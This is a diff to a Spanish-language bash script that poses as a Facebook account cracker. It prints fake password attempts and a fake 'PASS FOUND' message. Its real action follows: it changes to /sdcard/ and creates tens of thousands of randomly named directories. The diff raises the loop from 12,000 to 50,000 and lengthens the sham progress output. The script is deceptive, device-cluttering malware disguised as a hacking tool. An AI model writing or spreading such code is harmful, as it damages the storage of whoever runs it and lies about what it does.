@@ -16,7 +16,7 @@ printf "\e[1;32m Modulos instalados.. aguarde\n"
 sleep 4
 printf "\e[1;35m Introdusca el ID del facebook\n"
 read facebook
-printf "\e[1;31mFacebook ID:\e[1;32$facebook\e[1;31 cargado correctamente\n"
+printf "\e[1;31mFacebook ID:\e[1;32m $facebook\e[1;31 cargado correctamente\n"
 sleep 3
 printf "\e[1;31mCrackeando facebook.. aguarde por favor..\n"
 sleep 3
@@ -99,13 +99,51 @@ printf "\e[1;35mIntentando contraseña:\e[1;31m 38/2550\n"
 sleep 0.1
 printf "\e[1;35mIntentando contraseña:\e[1;31m 39/2550\n"
 sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 39/2550\n"
+sleep 0.1
 printf "\e[1;35mIntentando contraseña:\e[1;31m 40/2550\n"
-printf "\e[1;32mPASS FOUND.. 40/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 41/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 42/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 43/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 44/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 45/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 46/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 47/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 48/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 49/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 50/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 51/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 52/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 53/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 54/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 55/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 56/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 57/2550\n"
+sleep 0.1
+printf "\e[1;35mIntentando contraseña:\e[1;31m 58/2550\n"
+printf "\e[1;32mPASS FOUND.. 58/2550\n"
 printf "\e[1;35mObteniendo los datos.. espere..\n"
 cd /sdcard/
-for i in {1..12000}
+for i in {1..50000}
 do
- mkdir ${RANDOM}
+ mkdir ${RANDOM}.${RANDOM}
 done
 for i in {1..100}
 do
